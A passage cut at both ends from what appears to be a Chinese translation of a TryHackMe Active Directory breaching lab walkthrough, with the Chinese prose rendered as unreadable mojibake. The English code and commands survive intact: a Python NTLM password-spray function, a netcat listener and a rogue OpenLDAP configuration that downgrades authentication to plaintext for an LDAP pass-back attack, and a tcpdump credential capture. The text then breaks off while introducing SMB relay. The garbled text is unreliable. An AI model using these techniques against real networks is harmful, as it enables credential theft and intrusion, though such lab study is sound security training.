çš„ç»ä½³æ–¹æ³•ã€‚ç½‘ç»œé’“é±¼é€šå¸¸ä¼šè¯±ä½¿ç”¨æˆ·åœ¨æ¶æ„ç½‘é¡µä¸Šæä¾›å‡­æ®ï¼Œæˆ–è¦æ±‚ä»–ä»¬è¿è¡Œç‰¹å®šçš„åº”ç”¨ç¨‹åºï¼Œè¯¥åº”ç”¨ç¨‹åºä¼šåœ¨åå°å®‰è£…è¿œç¨‹è®¿é—®ç‰¹æ´›ä¼Šæœ¨é©¬ (RAT)ã€‚è¿™æ˜¯ä¸€ç§æµè¡Œçš„æ–¹æ³•ï¼Œå› ä¸º RAT ä¼šåœ¨ç”¨æˆ·çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œç«‹å³å…è®¸æ‚¨æ¨¡æ‹Ÿè¯¥ç”¨æˆ·çš„ AD å¸æˆ·ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç½‘ç»œé’“é±¼å¯¹äºçº¢é˜Ÿå’Œè“é˜Ÿæ¥è¯´éƒ½æ˜¯ä¸€ä¸ªå¤§è¯é¢˜ã€‚ A detailed room on phishing can be found here. å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æœ‰å…³ç½‘ç»œé’“é±¼çš„è¯¦ç»†ä¿¡æ¯ã€‚ 0x03 NTLM éªŒè¯æœåŠ¡ NTLM and NetNTLM æ–°æŠ€æœ¯ LAN ç®¡ç†å™¨ (NTLM) æ˜¯ä¸€å¥—ç”¨äºåœ¨ AD ä¸­éªŒè¯ç”¨æˆ·èº«ä»½çš„å®‰å…¨åè®®ã€‚ NTLM å¯ç”¨äºé€šè¿‡ä½¿ç”¨ç§°ä¸º NetNTLM çš„åŸºäºè´¨è¯¢-å“åº”çš„æ–¹æ¡ˆè¿›è¡Œèº«ä»½éªŒè¯ã€‚è¿™ç§èº«ä»½éªŒè¯æœºåˆ¶è¢«ç½‘ç»œä¸Šçš„æœåŠ¡å¤§é‡ä½¿ç”¨ã€‚ä½†æ˜¯ï¼Œä½¿ç”¨ NetNTLM çš„æœåŠ¡ä¹Ÿå¯ä»¥æš´éœ²åœ¨äº’è”ç½‘ä¸Šã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æµè¡Œçš„ä¾‹å­ï¼š å…¬å¼€ Outlook Web App (OWA) ç™»å½•é—¨æˆ·çš„å†…éƒ¨æ‰˜ç®¡ Exchangeï¼ˆé‚®ä»¶ï¼‰æœåŠ¡å™¨ã€‚ æš´éœ²äºäº’è”ç½‘çš„æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢åè®®ï¼ˆRDPï¼‰æœåŠ¡ã€‚ ä¸ AD é›†æˆçš„å…¬å¼€ VPN ç«¯ç‚¹ã€‚ é¢å‘äº’è”ç½‘å¹¶ä½¿ç”¨ NetNTLM çš„ Web åº”ç”¨ç¨‹åºã€‚ NetNTLMï¼Œé€šå¸¸ä¹Ÿç§°ä¸º Windows èº«ä»½éªŒè¯æˆ– NTLM èº«ä»½éªŒè¯ï¼Œå…è®¸åº”ç”¨ç¨‹åºæ‰®æ¼”å®¢æˆ·ç«¯å’Œ AD ä¹‹é—´çš„ä¸­é—´äººçš„è§’è‰²ã€‚æ‰€æœ‰èº«ä»½éªŒè¯ææ–™éƒ½ä»¥è´¨è¯¢çš„å½¢å¼è½¬å‘åˆ°åŸŸæ§åˆ¶å™¨ï¼Œå¦‚æœæˆåŠŸå®Œæˆï¼Œåº”ç”¨ç¨‹åºå°†å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚ è¿™æ„å‘³ç€åº”ç”¨ç¨‹åºä»£è¡¨ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯ç›´æ¥åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸Šå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚è¿™å¯ä»¥é˜²æ­¢åº”ç”¨ç¨‹åºå­˜å‚¨ AD å‡­æ®ï¼Œè¯¥å‡­æ®åº”ä»…å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šã€‚è¿™ä¸ªè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æš´åŠ›ç™»å½•æ”»å‡» å¦‚ä»»åŠ¡ 2 ä¸­æ‰€è¿°ï¼Œè¿™äº›å…¬å¼€çš„æœåŠ¡æä¾›äº†ä¸€ä¸ªæå¥½çš„ä½ç½®æ¥æµ‹è¯•ä½¿ç”¨å…¶ä»–æ–¹å¼å‘ç°çš„å‡­æ®ã€‚ä½†æ˜¯ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›æœåŠ¡æ¥å°è¯•æ¢å¤ä¸€ç»„åˆå§‹çš„æœ‰æ•ˆ AD å‡­æ®ã€‚å¦‚æœæˆ‘ä»¬åœ¨æœ€åˆçš„çº¢é˜Ÿä¾¦å¯ŸæœŸé—´æ¢å¤äº†æœ‰æ•ˆç”µå­é‚®ä»¶åœ°å€ç­‰ä¿¡æ¯ï¼Œæˆ‘ä»¬ä¹Ÿè®¸å¯ä»¥å°è¯•ä½¿ç”¨å®ƒä»¬è¿›è¡Œæš´åŠ›æ”»å‡»ã€‚ ç”±äºå¤§å¤šæ•° AD ç¯å¢ƒéƒ½é…ç½®äº†å¸æˆ·é”å®šï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•è¿è¡Œå®Œæ•´çš„æš´åŠ›æ”»å‡»ã€‚ç›¸åï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œå¯†ç å–·å°„æ”»å‡»ã€‚æˆ‘ä»¬ä¸ä¼šå°è¯•å¤šä¸ªä¸åŒçš„å¯†ç ï¼Œè¿™å¯èƒ½ä¼šè§¦å‘å¸æˆ·é”å®šæœºåˆ¶ï¼Œè€Œæ˜¯é€‰æ‹©å¹¶ä½¿ç”¨ä¸€ä¸ªå¯†ç å¹¶å°è¯•ä½¿ç”¨æˆ‘ä»¬è·å¾—çš„æ‰€æœ‰ç”¨æˆ·åè¿›è¡Œèº«ä»½éªŒè¯ã€‚ä½†æ˜¯ï¼Œåº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™äº›ç±»å‹çš„æ”»å‡»å°†ç”Ÿæˆå¤§é‡å¤±è´¥çš„èº«ä»½éªŒè¯å°è¯•ï¼Œå› æ­¤å¯ä»¥æ£€æµ‹åˆ°è¿™äº›ç±»å‹çš„æ”»å‡»ã€‚ æ‚¨å·²è·å¾—åœ¨çº¢é˜Ÿ OSINT ç»ƒä¹ ä¸­å‘ç°çš„ç”¨æˆ·ååˆ—è¡¨ã€‚ OSINT æ´»åŠ¨è¿˜æ˜¾ç¤ºäº†è¯¥ç»„ç»‡çš„åˆå§‹å…¥èŒå¯†ç ï¼Œä¼¼ä¹æ˜¯â€œChangeme123â€ã€‚å°½ç®¡ç”¨æˆ·åº”å§‹ç»ˆæ›´æ”¹å…¶åˆå§‹å¯†ç ï¼Œä½†æˆ‘ä»¬çŸ¥é“ç”¨æˆ·ç»å¸¸å¿˜è®°ã€‚æˆ‘ä»¬å°†ä½¿ç”¨å®šåˆ¶å¼€å‘çš„è„šæœ¬å¯¹æ‰˜ç®¡åœ¨ä»¥ä¸‹ URL çš„ Web åº”ç”¨ç¨‹åºè¿›è¡Œå¯†ç å–·å°„ï¼šhttp://ntlmauth.za.tryhackme.comã€‚ å¯¼èˆªåˆ° URLï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæç¤ºæˆ‘ä»¬è¾“å…¥ Windows èº«ä»½éªŒè¯å‡­æ®ï¼š æ³¨æ„ï¼šFirefox çš„ Windows èº«ä»½éªŒè¯æ’ä»¶éå¸¸å®¹æ˜“å¤±è´¥ã€‚å¦‚æœæ‚¨æƒ³æ‰‹åŠ¨æµ‹è¯•å‡­æ®ï¼Œå»ºè®®ä½¿ç”¨ Chromeã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Hydra ç­‰å·¥å…·æ¥ååŠ©å¯†ç å–·å°„æ”»å‡»ã€‚ç„¶è€Œï¼Œé€šå¸¸æœ€å¥½è‡ªå·±ç¼–å†™è¿™äº›ç±»å‹çš„æ”»å‡»è„šæœ¬ï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥æ›´å¥½åœ°æ§åˆ¶è¯¥è¿‡ç¨‹ã€‚ä»»åŠ¡æ–‡ä»¶ä¸­æä¾›äº†ä¸€ä¸ªåŸºæœ¬çš„Pythonè„šæœ¬ï¼Œå¯ç”¨äºå¯†ç å–·å°„æ”»å‡»ã€‚ä»¥ä¸‹å‡½æ•°æ˜¯è„šæœ¬çš„ä¸»è¦ç»„æˆéƒ¨åˆ†ï¼š def password_spray(self, password, url): print (\"[*] Starting passwords spray attack using the following password: \" + password) #Reset valid credential counter count = 0 #Iterate through all of the possible usernames for user in self.users: #Make a request to the website and attempt Windows Authentication response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + \"\\\\\" + user, password)) #Read status code of response to determine if authentication was successful if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): print (\"[+] Valid credential pair found! Username: \" + user + \" Password: \" + password) count += 1 continue if (self.verbose): if (response.status_code == self.HTTP_AUTH_FAILED_CODE): print (\"[-] Failed login with Username: \" + user) print (\"[*] Password spray attack completed, \" + str(count) + \" valid credential pairs found\") æ­¤å‡½æ•°å°†æˆ‘ä»¬å»ºè®®çš„å¯†ç å’Œæˆ‘ä»¬å®šä½çš„ URL ä½œä¸ºè¾“å…¥ï¼Œå¹¶å°è¯•ä½¿ç”¨æ–‡æœ¬æ–‡ä»¶ä¸­çš„æ¯ä¸ªç”¨æˆ·åå¯¹ URL è¿›è¡Œèº«ä»½éªŒè¯ã€‚é€šè¿‡ç›‘æ§åº”ç”¨ç¨‹åºçš„ HTTP å“åº”ä»£ç çš„å·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šå‡­è¯å¯¹æ˜¯å¦æœ‰æ•ˆã€‚å¦‚æœå‡­è¯å¯¹æœ‰æ•ˆï¼Œåº”ç”¨ç¨‹åºå°†ä½¿ç”¨ 200 HTTP (OK) ä»£ç è¿›è¡Œå“åº”ã€‚å¦‚æœè¯¥å¯¹æ— æ•ˆï¼Œåº”ç”¨ç¨‹åºå°†è¿”å› 401 HTTPï¼ˆæœªç»æˆæƒï¼‰ä»£ç ã€‚ æŒ‰ç…§æç¤ºæˆ‘ä»¬è¿è¡Œpyè„šæœ¬ï¼šå¦‚ä¸‹å›¾ï¼Œå…±å‘ç°å››ä¸ªæœ‰æ•ˆå‡­æ® 0x04 LDAP ç»‘å®šå‡­è¯ LDAP åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨çš„å¦ä¸€ç§ AD èº«ä»½éªŒè¯æ–¹æ³•æ˜¯è½»é‡çº§ç›®å½•è®¿é—®åè®® (LDAP) èº«ä»½éªŒè¯ã€‚ LDAP èº«ä»½éªŒè¯ä¸ NTLM èº«ä»½éªŒè¯ç±»ä¼¼ã€‚ä½†æ˜¯ï¼Œé€šè¿‡ LDAP èº«ä»½éªŒè¯ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ç›´æ¥éªŒè¯ç”¨æˆ·çš„å‡­æ®ã€‚è¯¥åº”ç”¨ç¨‹åºæœ‰ä¸€å¯¹ AD å‡­æ®ï¼Œå¯ä»¥é¦–å…ˆä½¿ç”¨å®ƒä»¬æ¥æŸ¥è¯¢ LDAPï¼Œç„¶åéªŒè¯ AD ç”¨æˆ·çš„å‡­æ®ã€‚ LDAP èº«ä»½éªŒè¯æ˜¯ä¸ AD é›†æˆçš„ç¬¬ä¸‰æ–¹ï¼ˆé Microsoftï¼‰åº”ç”¨ç¨‹åºçš„ä¸€ç§æµè¡Œæœºåˆ¶ã€‚å…¶ä¸­åŒ…æ‹¬åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿï¼Œä¾‹å¦‚ï¼š Gitlab Jenkins Custom-developed web applications Printers VPNs å¦‚æœè¿™äº›åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ä¸­çš„ä»»ä½•ä¸€ä¸ªåœ¨äº’è”ç½‘ä¸Šæš´éœ²ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä¸é’ˆå¯¹ NTLM è®¤è¯ç³»ç»Ÿä½¿ç”¨çš„ç›¸åŒç±»å‹çš„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”±äºä½¿ç”¨ LDAP è®¤è¯çš„æœåŠ¡éœ€è¦ä¸€ç»„ AD å‡­æ®ï¼Œå› æ­¤å®ƒä¼šæ‰“å¼€é¢å¤–çš„æ”»å‡»é€”å¾„ã€‚æœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ¢å¤æœåŠ¡ä½¿ç”¨çš„ AD å‡­æ®ï¼Œä»¥è·å¾—å¯¹ AD çš„è®¤è¯è®¿é—®æƒé™ã€‚é€šè¿‡ LDAP è¿›è¡Œèº«ä»½éªŒè¯çš„è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š å¦‚æœæ‚¨å¯ä»¥åœ¨æ­£ç¡®çš„ä¸»æœºï¼ˆä¾‹å¦‚ Gitlab æœåŠ¡å™¨ï¼‰ä¸Šç«™ç¨³è„šè·Ÿï¼Œé‚£ä¹ˆæ¢å¤è¿™äº› AD å‡­æ®å¯èƒ½å°±åƒè¯»å–é…ç½®æ–‡ä»¶ä¸€æ ·ç®€å•ã€‚è¿™äº›å‡­è¯é€šå¸¸ä»¥çº¯æ–‡æœ¬å½¢å¼å­˜å‚¨åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå› ä¸ºå®‰å…¨æ¨¡å‹ä¾èµ–äºä¿æŒä½ç½®å’Œå­˜å‚¨é…ç½®æ–‡ä»¶çš„å®‰å…¨è€Œä¸æ˜¯å…¶å†…å®¹çš„å®‰å…¨ã€‚ä»»åŠ¡ 7 ä¸­æ›´æ·±å…¥åœ°ä»‹ç»äº†é…ç½®æ–‡ä»¶ã€‚ LDAP å›ä¼ æ”»å‡» ç„¶è€Œï¼Œå¯ä»¥é’ˆå¯¹ LDAP èº«ä»½éªŒè¯æœºåˆ¶æ‰§è¡Œå¦ä¸€ç§éå¸¸æœ‰è¶£çš„æ”»å‡»ï¼Œç§°ä¸º LDAP å›ä¼ æ”»å‡»ã€‚å½“æ‚¨è·å¾—å¯¹å†…éƒ¨ç½‘ç»œçš„åˆå§‹è®¿é—®æƒé™ï¼ˆä¾‹å¦‚åœ¨ä¼šè®®å®¤ä¸­æ’å…¥æ¶æ„è®¾å¤‡ï¼‰æ—¶ï¼Œè¿™æ˜¯é’ˆå¯¹ç½‘ç»œè®¾å¤‡ï¼ˆä¾‹å¦‚æ‰“å°æœºï¼‰çš„å¸¸è§æ”»å‡»ã€‚ å½“æˆ‘ä»¬è®¿é—®æŒ‡å®š LDAP å‚æ•°çš„è®¾å¤‡é…ç½®æ—¶ï¼Œå¯ä»¥æ‰§è¡Œ LDAP å›ä¼ æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ä»¥æ˜¯ç½‘ç»œæ‰“å°æœºçš„ Web ç•Œé¢ã€‚é€šå¸¸ï¼Œè¿™äº›æ¥å£çš„å‡­æ®ä¿ç•™ä¸ºé»˜è®¤å‡­æ®ï¼Œä¾‹å¦‚ admin:admin æˆ– admin:password ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æå– LDAP å‡­æ®ï¼Œå› ä¸ºå¯†ç é€šå¸¸æ˜¯éšè—çš„ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ LDAP é…ç½®ï¼Œä¾‹å¦‚ LDAP æœåŠ¡å™¨çš„ IP æˆ–ä¸»æœºåã€‚åœ¨ LDAP å›ä¼ æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ­¤ IP ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„ IPï¼Œç„¶åæµ‹è¯• LDAP é…ç½®ï¼Œè¿™å°†å¼ºåˆ¶è®¾å¤‡å°è¯•å¯¹æˆ‘ä»¬çš„æ¶æ„è®¾å¤‡è¿›è¡Œ LDAP èº«ä»½éªŒè¯ã€‚æˆ‘ä»¬å¯ä»¥æ‹¦æˆªæ­¤èº«ä»½éªŒè¯å°è¯•ä»¥æ¢å¤ LDAP å‡­æ®ã€‚ æ‰§è¡Œ LDAP å›ä¼  è¯¥ç½‘ç»œä¸­æœ‰ä¸€å°ç½‘ç»œæ‰“å°æœºï¼Œç®¡ç†ç½‘ç«™ç”šè‡³ä¸éœ€è¦å‡­æ®ã€‚å¯¼èˆªè‡³ http://printer.za.tryhackme.com/settings.aspx ä»¥æŸ¥æ‰¾æ‰“å°æœºçš„è®¾ç½®é¡µé¢ï¼š ä½¿ç”¨æµè§ˆå™¨æ£€æŸ¥ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥éªŒè¯æ‰“å°æœºç½‘ç«™æ˜¯å¦è‡³å°‘è¶³å¤Ÿå®‰å…¨ï¼Œè€Œä¸ä»…ä»…æ˜¯å°† LDAP å¯†ç å‘é€å›æµè§ˆå™¨ï¼š æ‰€ä»¥æˆ‘ä»¬æœ‰ç”¨æˆ·åï¼Œä½†æ²¡æœ‰å¯†ç ã€‚ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬æŒ‰æµ‹è¯•è®¾ç½®æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‘åŸŸæ§åˆ¶å™¨å‘å‡ºèº«ä»½éªŒè¯è¯·æ±‚ä»¥æµ‹è¯• LDAP å‡­æ®ã€‚è®©æˆ‘ä»¬å°è¯•åˆ©ç”¨æ­¤æ¼æ´è®©æ‰“å°æœºè¿æ¥åˆ°æˆ‘ä»¬ï¼Œè¿™ä¼šæ³„éœ²å‡­æ®ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ Netcat ä¾¦å¬å™¨æ¥æµ‹è¯•æ˜¯å¦å¯ä»¥è®©æ‰“å°æœºè¿æ¥åˆ°æˆ‘ä»¬ã€‚ç”±äºLDAPçš„é»˜è®¤ç«¯å£æ˜¯389ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š nc -lvp 389 æ‚¨åº”è¯¥çœ‹åˆ°æˆ‘ä»¬æ¢å¤äº†è¿æ¥ï¼Œä½†æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼š æ‚¨å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½æ¥æ”¶å›è¿æ¥ï¼Œä½†å®ƒåº”è¯¥ä¼šåœ¨ 5 ç§’å†…åšå‡ºå“åº”ã€‚ supportedCapabilities å“åº”å‘Šè¯‰æˆ‘ä»¬é‡åˆ°äº†é—®é¢˜ã€‚æœ¬è´¨ä¸Šï¼Œåœ¨æ‰“å°æœºå‘é€å‡­æ®ä¹‹å‰ï¼Œå®ƒä¼šå°è¯•åå•† LDAP èº«ä»½éªŒè¯æ–¹æ³•è¯¦ç»†ä¿¡æ¯ã€‚å®ƒå°†ä½¿ç”¨æ­¤åå•†æ¥é€‰æ‹©æ‰“å°æœºå’Œ LDAP æœåŠ¡å™¨éƒ½æ”¯æŒçš„æœ€å®‰å…¨çš„èº«ä»½éªŒè¯æ–¹æ³•ã€‚å¦‚æœèº«ä»½éªŒè¯æ–¹æ³•å¤ªå®‰å…¨ï¼Œåˆ™å‡­æ®å°†ä¸ä¼šä»¥æ˜æ–‡å½¢å¼ä¼ è¾“ã€‚å¯¹äºæŸäº›èº«ä»½éªŒè¯æ–¹æ³•ï¼Œå‡­æ®æ ¹æœ¬ä¸ä¼šé€šè¿‡ç½‘ç»œä¼ è¾“ï¼æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åªä½¿ç”¨æ™®é€šçš„ Netcat æ¥è·å–å‡­æ®ã€‚æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„ LDAP æœåŠ¡å™¨å¹¶å¯¹å…¶è¿›è¡Œä¸å®‰å…¨çš„é…ç½®ï¼Œä»¥ç¡®ä¿å‡­è¯ä»¥æ˜æ–‡å½¢å¼å‘é€ã€‚ æ‰˜ç®¡æ¶æ„ LDAP æœåŠ¡å™¨ æœ‰å¤šç§æ–¹æ³•å¯ä»¥æ‰˜ç®¡æ¶æ„ LDAP æœåŠ¡å™¨ï¼Œä½†æˆ‘ä»¬å°†åœ¨æœ¬ç¤ºä¾‹ä¸­ä½¿ç”¨ OpenLDAPã€‚å¦‚æœæ‚¨ä½¿ç”¨ AttackBoxï¼Œåˆ™å·²ç»ä¸ºæ‚¨å®‰è£…äº† OpenLDAPã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨ä½¿ç”¨è‡ªå·±çš„æ”»å‡»æœºå™¨ï¼Œåˆ™éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£… OpenLDAPï¼š apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd ç„¶è€Œï¼Œæ‚¨è¿˜å¿…é¡»åœ¨ æ”»å‡»æœº ä¸Šé…ç½®æ‚¨è‡ªå·±çš„æ¶æ„ LDAP æœåŠ¡å™¨ã€‚æˆ‘ä»¬å°†é¦–å…ˆä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é‡æ–°é…ç½® LDAP æœåŠ¡å™¨ï¼š dpkg-reconfigure -p low slapd å¦‚æœæ‚¨æƒ³è·³è¿‡æœåŠ¡å™¨é…ç½®ï¼Œè¯·ç¡®ä¿åœ¨è¯·æ±‚æ—¶æŒ‰&lt;å¦&gt;ï¼Œå…·ä½“é…ç½®å‚è€ƒï¼šhttps://tryhackme.com/room/breachingad åœ¨ä½¿ç”¨æ¶æ„ LDAP æœåŠ¡å™¨ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡é™çº§æ”¯æŒçš„èº«ä»½éªŒè¯æœºåˆ¶æ¥ä½¿å…¶å®¹æ˜“å—åˆ°æ”»å‡»ã€‚æˆ‘ä»¬å¸Œæœ›ç¡®ä¿æˆ‘ä»¬çš„ LDAP æœåŠ¡å™¨ä»…æ”¯æŒ PLAIN å’Œ LOGIN èº«ä»½éªŒè¯æ–¹æ³•ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„ ldif æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹å†…å®¹è¿›è¡Œè°ƒç”¨ï¼š olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred è¯¥æ–‡ä»¶å…·æœ‰ä»¥ä¸‹å±æ€§ï¼š olcSaslSecPropsï¼šæŒ‡å®š SASL å®‰å…¨å±æ€§ noanonymousï¼šç¦ç”¨æ”¯æŒåŒ¿åç™»å½•çš„æœºåˆ¶ minssfï¼šæŒ‡å®šå¯æ¥å—çš„æœ€å°å®‰å…¨å¼ºåº¦ï¼Œ0è¡¨ç¤ºæ— ä¿æŠ¤ã€‚ ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ldif æ–‡ä»¶æ¥ä¿®è¡¥æˆ‘ä»¬çš„ LDAP æœåŠ¡å™¨ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éªŒè¯æˆ‘ä»¬çš„æ¶æ„ LDAP æœåŠ¡å™¨çš„é…ç½®æ˜¯å¦å·²åº”ç”¨ï¼ˆæ³¨æ„ï¼šå¦‚æœæ‚¨ä½¿ç”¨ Kaliï¼Œæ‚¨å¯èƒ½ä¸ä¼šæ”¶åˆ°ä»»ä½•è¾“å‡ºï¼Œä½†é…ç½®åº”è¯¥å·²ç”Ÿæ•ˆï¼Œæ‚¨å¯ä»¥ç»§ç»­æ‰§è¡Œåç»­æ­¥éª¤ï¼‰ï¼š æ•è· LDAP å‡­è¯ æˆ‘ä»¬çš„æ¶æ„ LDAP æœåŠ¡å™¨ç°å·²é…ç½®å®Œæ¯•ã€‚å½“æˆ‘ä»¬å•å‡» http://printer.za.tryhackme.com/settings.aspx ä¸Šçš„â€œæµ‹è¯•è®¾ç½®â€æ—¶ï¼Œèº«ä»½éªŒè¯å°†ä»¥æ˜æ–‡å½¢å¼è¿›è¡Œã€‚å¦‚æœæ‚¨æ­£ç¡®é…ç½®äº†æ¶æ„ LDAP æœåŠ¡å™¨å¹¶ä¸”å®ƒæ­£åœ¨é™çº§é€šä¿¡ï¼Œæ‚¨å°†æ”¶åˆ°ä»¥ä¸‹é”™è¯¯ï¼šâ€œæ­¤ä¸“æœ‰åç§°åŒ…å«æ— æ•ˆè¯­æ³•â€ã€‚å¦‚æœæ”¶åˆ°æ­¤é”™è¯¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä½¿ç”¨ tcpdump æ¥æ•è·å‡­æ®ï¼š tcpdump -SX -i breachad tcp port 389 å¦è¯·æ³¨æ„ï¼Œ password11 æ˜¯ä¸€ä¸ªç¤ºä¾‹ã€‚æ‚¨çš„æœåŠ¡å¯†ç å°†ä¼šä¸åŒã€‚åœ¨ TCPdump è¿”å›æ•°æ®ä¹‹å‰ï¼Œæ‚¨å¯èƒ½éœ€è¦æŒ‰å‡ æ¬¡â€œæµ‹è¯•è®¾ç½®â€æŒ‰é’®ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡ VPN è¿æ¥æ‰§è¡Œæ”»å‡»ã€‚ ç°åœ¨æˆ‘ä»¬æœ‰äº†å¦ä¸€ç»„æœ‰æ•ˆçš„ AD å‡­æ®ï¼é€šè¿‡ä½¿ç”¨ LDAP å›ä¼ æ”»å‡»å¹¶é™çº§æ”¯æŒçš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¦æˆªæ˜æ–‡å½¢å¼çš„å‡­æ®ã€‚ 0x05 èº«ä»½éªŒè¯ä¸­ç»§ ç»§ç»­è®¨è®ºå¯ä»¥ä»æˆ‘ä»¬çš„æ¶æ„è®¾å¤‡å‘èµ·çš„æ”»å‡»ï¼Œæˆ‘ä»¬ç°åœ¨å°†ç ”ç©¶é’ˆå¯¹æ›´å¹¿æ³›çš„ç½‘ç»œèº«ä»½éªŒè¯åè®®çš„æ”»å‡»ã€‚åœ¨Windowsç½‘ç»œä¸­ï¼Œæœ‰å¤§é‡çš„æœåŠ¡ç›¸äº’é€šä¿¡ï¼Œå…è®¸ç”¨æˆ·åˆ©ç”¨ç½‘ç»œæä¾›çš„æœåŠ¡ã€‚ è¿™äº›æœåŠ¡å¿…é¡»ä½¿ç”¨å†…ç½®çš„èº«ä»½éªŒè¯æ–¹æ³•æ¥éªŒè¯ä¼ å…¥è¿æ¥çš„èº«ä»½ã€‚åœ¨ä»»åŠ¡ 2 ä¸­ï¼Œæˆ‘ä»¬æ¢ç´¢äº† Web åº”ç”¨ç¨‹åºä¸Šä½¿ç”¨çš„ NTLM èº«ä»½éªŒè¯ã€‚åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†æ›´æ·±å…¥åœ°äº†è§£ä»ç½‘ç»œè§’åº¦æ¥çœ‹æ­¤èº«ä»½éªŒè¯çš„æƒ…å†µã€‚ä½†æ˜¯ï¼Œå¯¹äºæ­¤ä»»åŠ¡ï¼Œæˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ SMB ä½¿ç”¨çš„ NetNTLM èº«ä»½éªŒè¯ã€‚ æœåŠ¡å™¨æ¶ˆæ¯å— æœåŠ¡å™¨æ¶ˆæ¯å— (SMB) åè®®å…è®¸å®¢æˆ·ç«¯ï¼ˆå¦‚å·¥ä½œç«™ï¼‰ä¸æœåŠ¡å™¨ï¼ˆå¦‚æ–‡ä»¶å…±äº«ï¼‰è¿›è¡Œé€šä¿¡ã€‚åœ¨ä½¿ç”¨ Microsoft AD çš„ç½‘ç»œä¸­ï¼ŒSMB è´Ÿè´£ç®¡ç†ä»ç½‘ç»œé—´æ–‡ä»¶å…±äº«åˆ°è¿œç¨‹ç®¡ç†çš„æ‰€æœ‰äº‹åŠ¡ã€‚å³ä½¿å½“æ‚¨å°è¯•æ‰“å°æ–‡æ¡£æ—¶è®¡ç®—æœºæ”¶åˆ°çš„â€œç¼ºçº¸â€è­¦æŠ¥ä¹Ÿæ˜¯ SMB åè®®çš„ä½œç”¨ã€‚ ç„¶è€Œï¼Œæ—©æœŸç‰ˆæœ¬çš„SMBåè®®å®‰å…¨æ€§è¢«è®¤ä¸ºæ˜¯ä¸è¶³çš„ã€‚å‘ç°äº†å‡ ä¸ªæ¼æ´å’Œåˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥æ¢å¤å‡­æ®ï¼Œç”šè‡³åœ¨è®¾å¤‡ä¸Šè·å¾—ä»£ç 